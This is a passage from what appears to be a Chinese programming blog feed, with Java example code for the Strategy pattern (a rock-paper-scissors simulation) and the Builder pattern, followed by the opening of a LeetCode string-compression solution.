<h3 id="Hand"><a href="#Hand" class="headerlink" title="Hand"></a>Hand</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hand</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HANDVALUE_GUO = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HANDVALUE_CHO = <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HANDVALUE_PAA = <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> handvalue;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Hand[] hand = &#123;</span><br><span class="line">			<span class="keyword">new</span> Hand(HANDVALUE_GUO),</span><br><span class="line">			<span class="keyword">new</span> Hand(HANDVALUE_CHO),</span><br><span class="line">			<span class="keyword">new</span> Hand(HANDVALUE_PAA)</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] name = &#123;<span class="string">"石头"</span>, <span class="string">"剪刀"</span>, <span class="string">"布"</span>&#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Hand</span><span class="params">(<span class="keyword">int</span> handvalue)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.handvalue = handvalue;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Hand <span class="title">getHand</span><span class="params">(<span class="keyword">int</span> handvalue)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> hand[handvalue];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isStrongerThan</span><span class="params">(Hand hand)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> fight(hand) == <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isWeakerThan</span><span class="params">(Hand hand)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> fight(hand) == -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">fight</span><span class="params">(Hand hand)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == hand) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">this</span>.handvalue + <span class="number">1</span>) % <span class="number">3</span> == hand.handvalue) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name[handvalue];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Strategy"><a href="#Strategy" class="headerlink" title="Strategy"></a>Strategy</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Hand <span class="title">nextHand</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">(<span class="keyword">boolean</span> win)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WinningStrategy"><a href="#WinningStrategy" class="headerlink" title="WinningStrategy"></a>WinningStrategy</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WinningStrategy</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> won = <span class="keyword">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Hand privateHand;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WinningStrategy</span><span class="params">(<span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">		random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Hand <span class="title">nextHand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!won) &#123;</span><br><span class="line">			privateHand = Hand.getHand(random.nextInt(<span class="number">3</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> privateHand;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">(<span class="keyword">boolean</span> win)</span> </span>&#123;</span><br><span class="line">		won = win;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ProbStrategy"><a href="#ProbStrategy" class="headerlink" title="ProbStrategy"></a>ProbStrategy</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProbStrategy</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> prevHandValue = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> currentHandValue = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span>[][] history = &#123;</span><br><span class="line">			&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">			&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">			&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ProbStrategy</span><span class="params">(<span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Hand <span class="title">nextHand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> bet = random.nextInt(getSum(currentHandValue));</span><br><span class="line">		<span class="keyword">int</span> handvalue = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (bet &lt; history[currentHandValue][<span class="number">0</span>]) &#123;</span><br><span class="line">			handvalue = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (bet &lt; history[currentHandValue][<span class="number">0</span>] + history[currentHandValue][<span class="number">1</span>]) &#123;</span><br><span class="line">			handvalue = <span class="number">1</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			handvalue = <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		prevHandValue = currentHandValue;</span><br><span class="line">		currentHandValue = handvalue;</span><br><span class="line">		<span class="keyword">return</span> Hand.getHand(handvalue);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> handValue)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++) &#123;</span><br><span class="line">			sum += history[handValue][i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">(<span class="keyword">boolean</span> win)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (win) &#123;</span><br><span class="line">			history[prevHandValue][currentHandValue]++;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			history[prevHandValue][(currentHandValue + <span class="number">1</span>) % <span class="number">3</span>]++;</span><br><span class="line">			history[prevHandValue][(currentHandValue + <span class="number">2</span>) % <span class="number">3</span>]++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Player"><a href="#Player" class="headerlink" title="Player"></a>Player</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Player</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> Strategy strategy;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> winCount;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> loseCount;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> gameCount;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Player</span><span class="params">(String name, Strategy strategy)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.strategy = strategy;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Hand <span class="title">nextHand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> strategy.nextHand();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">win</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		strategy.study(<span class="keyword">true</span>);</span><br><span class="line">		winCount++;</span><br><span class="line">		gameCount++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		strategy.study(<span class="keyword">false</span>);</span><br><span class="line">		loseCount++;</span><br><span class="line">		gameCount++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">even</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		gameCount++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"["</span> + name + <span class="string">":"</span> + gameCount + <span class="string">" games, "</span> + winCount + <span class="string">" win, "</span> + loseCount + <span class="string">" lose ]."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">2</span> != args.length) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Usage: java Main randomseed1 randowseed2"</span>);</span><br><span class="line">			System.out.println(<span class="string">"Example: java Main 315 15"</span>);</span><br><span class="line">			System.exit(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> seed1 = Integer.parseInt(args[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">int</span> seed2 = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">		</span><br><span class="line">		Player player1 = <span class="keyword">new</span> Player(<span class="string">"A"</span>, <span class="keyword">new</span> WinningStrategy(seed1));</span><br><span class="line">		Player player2 = <span class="keyword">new</span> Player(<span class="string">"B"</span>, <span class="keyword">new</span> ProbStrategy(seed2));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10000</span>;i++) &#123;</span><br><span class="line">			Hand nextHand1 = player1.nextHand();</span><br><span class="line">			Hand nextHand2 = player2.nextHand();</span><br><span class="line">			<span class="keyword">if</span> (nextHand1.isStrongerThan(nextHand2)) &#123;</span><br><span class="line">				System.out.println(<span class="string">"Winner: "</span> + player1);</span><br><span class="line">				player1.win();</span><br><span class="line">				player2.lose();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nextHand2.isStrongerThan(nextHand1)) &#123;</span><br><span class="line">				System.out.println(<span class="string">"Winner:"</span> + player2);</span><br><span class="line">				player1.lose();</span><br><span class="line">				player2.win();</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				System.out.println(<span class="string">"Even......"</span>);</span><br><span class="line">				player1.even();</span><br><span class="line">				player2.even();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"Total result:"</span>);</span><br><span class="line">		System.out.println(player1.toString());</span><br><span class="line">		System.out.println(player2.toString());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>策略模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-建造者模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>建造者模式（Builder Pattern）使用多个简单的对象一步一步构建成一个复杂的对象。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p>
<p>一个 Builder 类会一步一步构造最终的对象。该 Builder 类是独立于其他对象的。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-builder1.png" alt="建造者模式类图"></p>
<h3 id="Builder（建造者）"><a href="#Builder（建造者）" class="headerlink" title="Builder（建造者）"></a>Builder（建造者）</h3><p>负责定义用于生成实例的接口。准备了用于生成实例的方法</p>
<h3 id="ConcreteBuilder（具体的建造者）"><a href="#ConcreteBuilder（具体的建造者）" class="headerlink" title="ConcreteBuilder（具体的建造者）"></a>ConcreteBuilder（具体的建造者）</h3><p>负责实现Builder角色的接口的类。定义了在生成实例时实际被调用的方法。此外，还定义了获取最终结果的方法。</p>
<h3 id="Director（监工）"><a href="#Director（监工）" class="headerlink" title="Director（监工）"></a>Director（监工）</h3><p>负责使用Builder的接口生成实例，不依赖于ConcreteBuilder。为了确保不论ConcreteBuilder是如何被定义的，Director都能正常工作，它只调用在Builder中被定义的方法。</p>
<h3 id="Client（使用者）"><a href="#Client（使用者）" class="headerlink" title="Client（使用者）"></a>Client（使用者）</h3><p>使用了Builder模式</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-builder2.png" alt="建造者模式时序图"></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-builder3.png" alt="建造者模式示例类图"></p>
<h3 id="Builder"><a href="#Builder" class="headerlink" title="Builder"></a>Builder</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">makeTitle</span><span class="params">(String title)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">makeString</span><span class="params">(String str)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">makeItem</span><span class="params">(String[] items)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Director"><a href="#Director" class="headerlink" title="Director"></a>Director</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Director</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Builder builder;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Director</span><span class="params">(Builder builder)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.builder = builder;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		builder.makeTitle(<span class="string">"Greating"</span>);</span><br><span class="line">		builder.makeString(<span class="string">"from morning to afternoon"</span>);</span><br><span class="line">		builder.makeItem(<span class="keyword">new</span> String[] &#123;<span class="string">"Good morning"</span>, <span class="string">"Good afternoon"</span>&#125;);</span><br><span class="line">		builder.makeString(<span class="string">"Evening"</span>);</span><br><span class="line">		builder.makeItem(<span class="keyword">new</span> String[] &#123;<span class="string">"Good evening"</span>, <span class="string">"Good night"</span>, <span class="string">"Bye"</span>&#125;);</span><br><span class="line">		builder.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HTMLBuilder"><a href="#HTMLBuilder" class="headerlink" title="HTMLBuilder"></a>HTMLBuilder</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HTMLBuilder</span> <span class="keyword">extends</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String fileName;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> PrintWriter writer;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		fileName = title + <span class="string">".html"</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			writer = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> FileWriter(fileName));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		writer.println(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;"</span> + title + <span class="string">"&lt;/title&gt;&lt;/head&gt;&lt;&lt;body&gt;"</span>);</span><br><span class="line">		writer.println(<span class="string">"&lt;h1&gt;"</span> + title + <span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeString</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		writer.println(<span class="string">"&lt;p&gt;"</span> + str + <span class="string">"&lt;/p&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeItem</span><span class="params">(String[] items)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		writer.println(<span class="string">"&lt;ul&gt;"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; items.length;i++) &#123;</span><br><span class="line">			writer.println(<span class="string">"&lt;li&gt;"</span> + items[i] + <span class="string">"&lt;/li&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		writer.println(<span class="string">"&lt;/ul&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		writer.println(<span class="string">"&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line">		writer.close();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> fileName;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TextBuilder"><a href="#TextBuilder" class="headerlink" title="TextBuilder"></a>TextBuilder</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextBuilder</span> <span class="keyword">extends</span> <span class="title">Builder</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		buffer.append(<span class="string">"================================\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"["</span> + title + <span class="string">"]\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeString</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		buffer.append(<span class="string">" "</span> + str + <span class="string">"\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeItem</span><span class="params">(String[] items)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; items.length;i++) &#123;</span><br><span class="line">			buffer.append(<span class="string">"  .  "</span> + items[i] + <span class="string">"\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer.append(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		buffer.append(<span class="string">"================================\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> buffer.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (args.length != <span class="number">1</span>) &#123;</span><br><span class="line">			usage();</span><br><span class="line">			System.exit(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (args[<span class="number">0</span>].equals(<span class="string">"plain"</span>)) &#123;</span><br><span class="line">			TextBuilder textBuilder = <span class="keyword">new</span> TextBuilder();</span><br><span class="line">			Director director = <span class="keyword">new</span> Director(textBuilder);</span><br><span class="line">			director.construct();</span><br><span class="line">			String result = textBuilder.getResult();</span><br><span class="line">			System.out.println(result);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[<span class="number">0</span>].equals(<span class="string">"html"</span>)) &#123;</span><br><span class="line">			HTMLBuilder htmlBuilder = <span class="keyword">new</span> HTMLBuilder();</span><br><span class="line">			Director director = <span class="keyword">new</span> Director(htmlBuilder);</span><br><span class="line">			director.construct();</span><br><span class="line">			String result = htmlBuilder.getResult();</span><br><span class="line">			System.out.println(result + <span class="string">" 文件编写完成"</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			usage();</span><br><span class="line">			System.exit(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Usage: java main plain    编写纯文本文档"</span>);</span><br><span class="line">		System.out.println(<span class="string">"Usage: java main html     编写html文档"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>建造者模式</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.06 字符串压缩</title>
    <url>/2020/04/08/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-01.06-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>字符串压缩。利用字符重复出现的次数，编写一种方法，实现基本的字符串压缩功能。比如，字符串aabcccccaaa会变为a2b1c5a3。若“压缩”后的字符串没有变短，则返回原先的字符串。你可以假设字符串中只包含大小写英文字母（a至z）</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;aabcccccaaa&quot;</span><br><span class="line">输出：&quot;a2b1c5a3&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="string">"abbccd"</span></span><br><span class="line">输出：<span class="string">"abbccd"</span></span><br><span class="line">解释：<span class="string">"abbccd"</span>压缩后为<span class="string">"a1b2c2d1"</span>，比原字符串长度更长。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历时统计</p>
<p>初始化时，currentChar是字符串的第一个字符</p>
<p>从1开始，如果当前位置上的字符，等于currentChar，count++，否则，将当前字符追加到sb上，然后currentChar设为当前字符，count重置为1</p>
